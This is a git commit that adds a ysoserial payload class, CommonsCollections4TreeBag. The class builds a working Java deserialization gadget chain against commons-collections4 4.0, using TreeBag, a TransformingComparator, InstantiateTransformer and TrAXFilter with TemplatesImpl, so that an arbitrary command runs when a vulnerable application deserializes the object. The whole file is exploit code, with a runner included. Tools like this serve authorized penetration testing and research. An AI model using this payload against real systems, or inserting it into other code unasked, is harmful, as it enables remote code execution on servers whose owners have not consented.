2a682de14aeb8288b8dca19f1239d30e68fe490a
0730Nophone <50388373+0730Nophone@users.noreply.github.com>
2021-11-18 15:43:12 +0800

    Create CommonsCollections4TreeBag.java

---
+++ CommonsCollections4TreeBag.java
@@ -0,0 +1,56 @@
+package ysoserial.payloads;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.bag.TreeBag;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
+
+import javax.xml.transform.Templates;
+import java.util.PriorityQueue;
+import java.util.Queue;
+
+@Dependencies({"org.apache.commons:commons-collections4:4.0"})
+@Authors({ Authors.FROHOFF })
+//在su18师傅看见的 TreeBag 替代Queue的思想
+public class CommonsCollections4TreeBag implements ObjectPayload<TreeBag<Object>> {
+    public TreeBag<Object> getObject(final String command) throws Exception {
+        Object templates = Gadgets.createTemplatesImpl(command);
+
+        ConstantTransformer constant = new ConstantTransformer(String.class);
+
+        // mock method name until armed
+        Class[] paramTypes = new Class[] { String.class };
+        Object[] args = new Object[] { "foo" };
+        InstantiateTransformer instantiate = new InstantiateTransformer(
+            paramTypes, args);
+
+        // grab defensively copied arrays
+        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
+        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
+
+        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+
+        // create queue with numbers
+
+        TreeBag tree = new TreeBag(new TransformingComparator(chain));
+        tree.add(1);
+
+        // swap in values to arm
+        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
+        paramTypes[0] = Templates.class;
+        args[0] = templates;
+        return tree;
+    }
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(CommonsCollections4TreeBag.class, args);
+    }
+}
